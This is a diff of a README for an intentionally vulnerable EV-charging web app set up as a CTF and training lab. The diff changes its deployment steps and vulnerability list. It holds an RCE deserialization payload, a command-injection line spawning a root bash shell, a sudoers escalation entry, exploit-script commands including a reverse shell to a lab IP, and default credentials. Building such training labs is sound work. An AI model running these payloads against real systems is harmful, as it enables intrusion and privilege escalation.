@@ -6,133 +6,100 @@ This is a deliberately vulnerable web application simulating a regional EV charg
 
 **⚠️ WARNING: This application contains intentional security vulnerabilities. DO NOT deploy in production environments!**
 
-## Vulnerabilities Included
-
-### 1. CVE-2025-55182 - React Server Components RCE (Critical)
-- **Location**: `/api/server-action`
-- **Type**: Pre-authentication Remote Code Execution
-- **Cause**: Unsafe deserialization in React Server Components
-- **CVSS**: 9.8
-
-### 2. Command Injection - Privilege Escalation (High)
-- **Location**: `/opt/maintenance/backup.js`
-- **Type**: Local Privilege Escalation
-- **Cause**: Unsanitized environment variable in shell command
-- **Exploitation**: `export BACKUP_TARGET="; /bin/bash -p" && sudo node /opt/maintenance/backup.js`
-
-### 3. IDOR - Insecure Direct Object Reference (Medium)
-- **Location**: `/api/user?user_id=X`
-- **Type**: Authorization bypass
-- **Cause**: No access control on user data endpoint
-
-### 4. Weak Authentication (Medium)
-- **Location**: `/api/auth`
-- **Type**: Cryptographic weakness
-- **Cause**: MD5 password hashing, base64 tokens without signature
-
-### 5. Information Disclosure (Low)
-- **Location**: HTTP headers, error messages
-- **Type**: Information leakage
-- **Cause**: Verbose errors, version disclosure in headers
-
-## Deployment
-
-### Prerequisites
-- Ubuntu 22.04 LTS
-- Node.js 20.x
-- nginx
-- Root access
-
-### Quick Deploy
+## Quick Start
 
 ```bash
-# Clone or copy files to server
-git clone <repository> /tmp/ecocharge
-cd /tmp/ecocharge
+# Clone repository
+git clone https://github.com/lota-ll/ecocharge-website.git
+cd ecocharge-website
 
-# Run setup script
+# Install dependencies
+npm install --legacy-peer-deps
+
+# Build
+npm run build
+
+# Start
+npm start
+```
+
+Application will be available at `http://localhost:3000`
+
+## Deployment on Server
+
+```bash
+# Run automated setup (requires root)
 chmod +x setup-server.sh
 sudo ./setup-server.sh
 ```
 
-### Manual Deploy
+The setup script will:
+- Install Node.js and dependencies
+- Configure nginx as reverse proxy
+- Create systemd service
+- Set up CTF flags
+- Configure privilege escalation vulnerability
 
-```bash
-# 1. Install Node.js
-curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
-sudo apt-get install -y nodejs
+## Vulnerabilities Included
 
-# 2. Create directories
-sudo mkdir -p /var/www/ecocharge
-sudo mkdir -p /opt/maintenance
-sudo mkdir -p /var/log/ecocharge
+| Vulnerability | Location | Severity | CVSS |
+|--------------|----------|----------|------|
+| React Server Components RCE | `/api/server-action` | Critical | 9.8 |
+| Command Injection (PrivEsc) | `/opt/maintenance/backup.js` | High | 7.8 |
+| IDOR | `/api/user?user_id=X` | Medium | 6.5 |
+| Weak Authentication (MD5) | `/api/auth` | Medium | 5.3 |
+| Information Disclosure | HTTP headers, errors | Low | 3.7 |
 
-# 3. Copy application files
-sudo cp -r ./* /var/www/ecocharge/
-sudo cp scripts/backup.js /opt/maintenance/
+## Default Credentials
 
-# 4. Install dependencies
-cd /var/www/ecocharge
-sudo npm install
+| Role | Email | Password |
+|------|-------|----------|
+| Admin | admin@ecocharge.local | EcoCharge2024! |
+| Operator | operator@ecocharge.local | Operator123! |
+| User | user@ecocharge.local | 12345678 |
 
-# 5. Set permissions
-sudo chown -R www-data:www-data /var/www/ecocharge
+## Project Structure
 
-# 6. Configure sudo for privilege escalation
-echo 'www-data ALL=(ALL) NOPASSWD: /usr/bin/node /opt/maintenance/backup.js' | sudo tee /etc/sudoers.d/ecocharge
-
-# 7. Create flags
-echo "FLAG{r34ct_s3rv3r_c0mp0n3nts_d3s3r14l1z4t10n}" | sudo tee /var/www/ecocharge/.flag1.txt
-echo "FLAG{pr1v3sc_v14_n0d3_c0mm4nd_1nj3ct10n}" | sudo tee /root/.flag2.txt
-sudo chmod 600 /root/.flag2.txt
-
-# 8. Start application
-cd /var/www/ecocharge
-sudo -u www-data npm start
 ```
-
-### Using PM2 (Recommended)
-
-```bash
-sudo npm install -g pm2
-cd /var/www/ecocharge
-sudo -u www-data pm2 start npm --name "ecocharge" -- start
-sudo -u www-data pm2 save
-sudo pm2 startup
-```
-
-## Network Configuration
-
-For the full CTF scenario, this server should be:
-
-| Parameter | Value |
-|-----------|-------|
-| IP Address | 192.168.125.50 |
-| Hostname | ecocharge-web |
-| Network | External (WAN) |
-
-### Firewall Rules (UFW)
-
-```bash
-sudo ufw allow 22/tcp    # SSH
-sudo ufw allow 80/tcp    # HTTP
-sudo ufw allow 443/tcp   # HTTPS
-sudo ufw enable
-```
-
-### hosts Entry (Attacker Machine)
-
-```bash
-echo "192.168.125.50 ecocharge.local" | sudo tee -a /etc/hosts
+ecocharge-website/
+├── app/
+│   ├── api/
+│   │   ├── auth/           # Authentication endpoints
+│   │   ├── server-action/  # Vulnerable RCE endpoint
+│   │   ├── stations/       # Stations API
+│   │   └── user/           # User API (IDOR)
+│   ├── admin/              # Admin panel
+│   │   ├── layout.js       # Admin layout
+│   │   ├── page.js         # Dashboard
+│   │   ├── stations/       # Stations management
+│   │   ├── users/          # Users management
+│   │   ├── transactions/   # Transactions history
+│   │   └── settings/       # System settings
+│   ├── auth/               # Login/Register pages
+│   ├── dashboard/          # User dashboard
+│   ├── stations/           # Public stations list
+│   ├── about/              # About page
+│   ├── prices/             # Pricing page
+│   ├── layout.js           # Main layout
+│   ├── page.js             # Homepage
+│   └── globals.css         # Styles
+├── scripts/
+│   └── backup.js           # Vulnerable backup script
+├── .env                    # Configuration (contains secrets)
+├── exploit.py              # CVE-2025-55182 exploit PoC
+├── setup-server.sh         # Deployment script
+├── package.json
+├── next.config.js
+└── README.md
 ```
 
 ## CTF Flags
 
-| Flag # | Location | Value | Points |
-|--------|----------|-------|--------|
-| 1 | `/var/www/ecocharge/.flag1.txt` | `FLAG{r34ct_s3rv3r_c0mp0n3nts_d3s3r14l1z4t10n}` | 100 |
-| 2 | `/root/.flag2.txt` | `FLAG{pr1v3sc_v14_n0d3_c0mm4nd_1nj3ct10n}` | 150 |
-| 3 | `.env` file | `FLAG{cr3d3nt14ls_1n_c0nf1g_f1l3s}` | 100 |
+| # | Location | Description |
+|---|----------|-------------|
+| 1 | `/var/www/ecocharge/.flag1.txt` | Initial access (www-data) |
+| 2 | `/root/.flag2.txt` | Privilege escalation (root) |
+| 3 | `.env` file | Credential leak |
 
 ## API Endpoints
 
@@ -142,29 +109,31 @@ echo "192.168.125.50 ecocharge.local" | sudo tee -a /etc/hosts
 | `/api/stations` | POST | Get station by ID |
 | `/api/auth` | POST | User authentication |
 | `/api/auth` | GET | Verify token |
-| `/api/user` | GET | Get user data (IDOR) |
-| `/api/user` | POST | Get user transactions |
+| `/api/auth/register` | POST | User registration |
+| `/api/user` | GET | Get user data (IDOR vulnerable) |
 | `/api/server-action` | POST | **VULNERABLE** - RCE endpoint |
+
+## Network Configuration
+
+| Parameter | Value |
+|-----------|-------|
+| IP Address | 192.168.125.50 |
+| Hostname | ecocharge-web |
+| Network | External (192.168.125.0/24) |
 
 ## Testing Vulnerabilities
 
-### Test CVE-2025-55182
+### Test RCE (CVE-2025-55182)
 
 ```bash
-# Check endpoint
-curl -X GET https://ecocharge.local/api/server-action -k
-
-# Exploit (example payload)
-curl -X POST https://ecocharge.local/api/server-action \
-  -H "Content-Type: application/json" \
-  -k \
-  -d '{"payload":{"$type":"ServerReference","$$id":"__webpack_require__","$$bound":[{"body":"require(\"child_process\").execSync(\"id\").toString()"}]}}'
+python3 exploit.py https://ecocharge.local check
+python3 exploit.py https://ecocharge.local exec 'id'
+python3 exploit.py https://ecocharge.local revshell 192.168.125.228 4444
 ```
 
 ### Test IDOR
 
 ```bash
-# Access other users' data
 curl https://ecocharge.local/api/user?user_id=1 -k
 curl https://ecocharge.local/api/user?user_id=2 -k
 ```
@@ -178,33 +147,12 @@ export BACKUP_TARGET="; id"
 sudo /usr/bin/node /opt/maintenance/backup.js
 ```
 
-## Logs
+## Technologies
 
-- Application: `journalctl -u ecocharge -f`
-- nginx: `/var/log/nginx/access.log`, `/var/log/nginx/error.log`
-- Custom: `/var/log/ecocharge/`
-
-## Troubleshooting
-
-### Application won't start
-```bash
-cd /var/www/ecocharge
-npm install
-sudo chown -R www-data:www-data .
-```
-
-### Port 3000 in use
-```bash
-sudo lsof -i :3000
-sudo kill -9 <PID>
-```
-
-### Check application status
-```bash
-systemctl status ecocharge
-# or
-pm2 status
-```
+- **Framework**: Next.js 14.2.5
+- **Frontend**: React 18.3.1, Tailwind CSS
+- **Database**: SQLite (simulated)
+- **Web Server**: nginx 1.24
 
 ## Security Notice
 
@@ -213,7 +161,7 @@ This application is intentionally vulnerable and should only be used in:
 - CTF competitions
 - Security training courses
 
-Never expose this application to the internet or use in production.
+**Never expose this application to the internet or use in production.**
 
 ## License
 
